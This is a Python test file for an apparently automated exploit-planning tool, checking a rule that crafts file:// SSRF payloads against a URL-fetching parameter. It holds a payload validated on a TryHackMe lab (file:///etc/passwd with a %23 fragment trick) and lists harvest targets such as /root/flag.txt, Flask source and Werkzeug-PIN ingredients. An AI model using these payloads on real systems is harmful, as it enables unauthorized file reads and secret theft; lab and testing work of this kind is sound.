"""URL-fetching GET param → file:// SSRF for arbitrary file read (CWE-918/73). An app that fetches a
user-supplied URL/server param usually accepts file:// too; a %23 fragment defeats apps that append a
suffix/id. Validated live on THM Plant Photographer: server=file:///etc/passwd%23&id=1 read files as
root and leaked the flag + the Flask source."""

from __future__ import annotations

from kryon.intelligence.exploit_chain_planner import _rule_ssrf_file_read, plan_next_action
from kryon.intelligence.fact_extractor import ExtractedFacts

_WEB = ExtractedFacts(services=((80, "http"),), hosts=("10.66.177.105",), paths=("/download?server=x",))


def test_fires_on_url_param_surface():
    rec = _rule_ssrf_file_read(_WEB, [], "")
    assert rec is not None and rec.confidence >= 0.92
    assert "file:///etc/passwd" in rec.args and "SSRF-FILE" in rec.args


def test_uses_fragment_trick_and_common_params():
    rec = _rule_ssrf_file_read(_WEB, [], "")
    assert "%23" in rec.args  # fragment to comment an appended suffix/id
    for k in ("server", "url", "file", "path"):
        assert k in rec.args
    # harvests flags + Flask source + Werkzeug-PIN ingredients
    assert "/root/flag.txt" in rec.args and "app.py" in rec.args and "eth0/address" in rec.args


def test_targets_discovered_query_endpoint():
    # the discovered ?server= path's base (/download) must be among the probed candidates
    rec = _rule_ssrf_file_read(_WEB, [], "")
    assert "/download" in rec.args


def test_abstains_without_web_or_paths():
    assert _rule_ssrf_file_read(ExtractedFacts(services=((80, "http"),), hosts=("x",)), [], "") is None
    assert _rule_ssrf_file_read(ExtractedFacts(hosts=("x",), paths=("/a?b=1",)), [], "") is None


def test_abstains_once_run():
    assert _rule_ssrf_file_read(_WEB, ["[SSRF-FILE ...]"], "") is None
